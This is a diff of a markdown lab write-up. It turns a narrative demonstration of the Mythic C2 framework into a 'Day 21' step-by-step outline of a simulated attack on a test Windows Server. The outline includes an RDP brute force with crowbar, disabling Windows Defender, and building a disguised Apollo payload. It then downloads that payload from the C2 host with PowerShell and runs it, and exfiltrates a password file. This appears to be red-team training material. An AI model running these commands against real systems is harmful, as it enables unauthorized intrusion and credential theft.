@@ -1,77 +1,67 @@
-# Mythic C2 Framework Demonstration
+# Day 21: Mythic C2 Framework Challenge - Step-by-Step Outline
 
-## Installing Apollo Agent
+## 1. Initial Setup
+1. Create a fake password file on the Windows Server
+   - Path: C:\Users\Administrator\Documents\passwords.txt
+   - Content: Winter2024!
 
-1. Install Apollo agent via Mythic's command-line interface (CLI):
+2. Change Windows Server password
+   - New password: Winter2024!
+   - Modify Group Policy to allow simpler passwords
 
-```bash
-sudo ./mythic-cli install agent from https://github.com/MythicAgents/Apollo
-```
+## 2. RDP Brute Force Attack
+1. Prepare wordlist on Kali Linux
+   - Use rockyou.txt as base
+   - Add custom password (Winter2024!)
 
-2. Once installed, the Apollo agent appeared in the Mythic web GUI, ready for configuration.
+2. Install and use Crowbar for brute force attack
+   - Command: `crowbar -b rdp -u administrator -C mydfir_wordlist.txt -s 149.248.59.41/32`
 
-## Configuring HTTP C2 Profile
+3. Successful login with xfreerdp
+   - Command: `xfreerdp /u:administrator /p:Winter2024! /v:149.248.59.41:3389`
 
-Next, I configured the HTTP C2 profile for communication between the attacker (C2 server) and the target (Windows Server). This involved setting up a communication channel that could handle traffic over HTTP.
+## 3. Post-Exploitation Discovery
+1. Run discovery commands on Windows Server
+   - whoami
+   - ipconfig
+   - net user
+   - net group
 
-1. Install the HTTP C2 profile from the Mythic GitHub repository:
+## 4. Defense Evasion
+1. Disable Windows Defender via GUI
 
-```bash
-sudo ./mythic-cli install c2_profile from https://github.com/MythicC2Profiles/http
-```
+## 5. Mythic C2 Setup
+1. Install Apollo agent in Mythic
+   - Command: `./mythic-cli install github https://github.com/MythicAgents/apollo`
 
-2. In the Mythic web GUI, I set the C2 profile's callback host to my public IP and selected port 80 for communication.
+2. Install HTTP C2 profile
+   - Command: `./mythic-cli install github https://github.com/MythicC2Profiles/http`
 
-## Creating and Deploying the Payload
+3. Generate payload in Mythic web GUI
+   - Agent: Apollo
+   - C2 Profile: HTTP
+   - Output: Windows executable
+   - Callback host: http://[Mythic server IP]
+   - Port: 80
 
-With the agent and C2 profile in place, I moved forward with creating the payload. This payload was designed for Windows and configured to use the HTTP C2 profile for communication.
+4. Download and rename payload on Mythic server
+   - New name: service_host_dstepro.exe
 
-1. Generate the payload in the Mythic web GUI:
-   - Choose the Apollo agent.
-   - Configure the payload to target a Windows executable format.
-   - Set the callback communication to use the HTTP profile with my Kali Linux server as the host.
-   - Include necessary commands for post-exploitation.
+## 6. Payload Delivery and Execution
+1. Set up Python HTTP server on Mythic server
+   - Command: `python3 -m http.server 9999`
 
-2. Host the payload on Kali Linux using a Python HTTP server:
+2. Download payload on Windows Server using PowerShell
+   - Command: `Invoke-WebRequest -Uri "http://[Mythic server IP]:9999/service_host_dstepro.exe" -OutFile "C:\Users\Public\Downloads\service_host_stepro.exe"`
 
-```bash
-python3 -m http.server 9999
-```
+3. Execute payload on Windows Server
 
-This allowed the Windows target machine to download the payload from my Kali machine, simulating a real-world payload delivery scenario.
+## 7. C2 Session Establishment
+1. Verify C2 connection in Mythic web GUI
+2. Run test commands (whoami, ipconfig) through Mythic interface
 
-## Execution and Establishing C2
+## 8. Data Exfiltration
+1. Use Mythic to download the password file
+   - Command: `download C:\Users\Administrator\Documents\passwords.txt`
 
-After the payload was downloaded and executed on the Windows Server, I confirmed that the C2 session was established through the Mythic web interface. The Apollo agent successfully called back to the C2 server, and the session was live.
-
-Check active connections on the Windows target using:
-
-```bash
-netstat -anob
-```
-
-The process associated with the Apollo agent was visible, confirming the successful establishment of the C2 session.
-
-## Post-Exploitation: File Exfiltration
-
-As part of the post-exploitation phase, I demonstrated the retrieval of sensitive information from the target system. I created a mock password file on the Windows Server named `passwords.txt` and stored it in the Administrator's Documents folder.
-
-1. Password file setup: Before launching the attack, I created a text file with mock credentials on the target system:
-
-```
-C:/Users/Administrator/Documents/passwords.txt
-```
-
-2. Retrieve the file using the Apollo agent's download command:
-
-```bash
-download C:/Users/Administrator/Documents/passwords.txt
-```
-
-3. The contents of the file (Winter2024!) were successfully exfiltrated and displayed in the Mythic interface.
-
-## Conclusion
-
-This demonstration highlights the flexibility of the Mythic C2 framework in establishing a C2 session and performing post-exploitation tasks, including file exfiltration. By leveraging the Apollo agent and the HTTP C2 profile, I was able to simulate a realistic attack scenario, showing the practical use of Mythic in red teaming exercises.
-
-It's important to note that this demonstration was conducted in a controlled environment with Kali Linux and a test Windows Server. These techniques should only be used for ethical hacking purposes with explicit permission. Unauthorized use of these tools is illegal.
+2. Verify exfiltrated file contents in Mythic web GUI
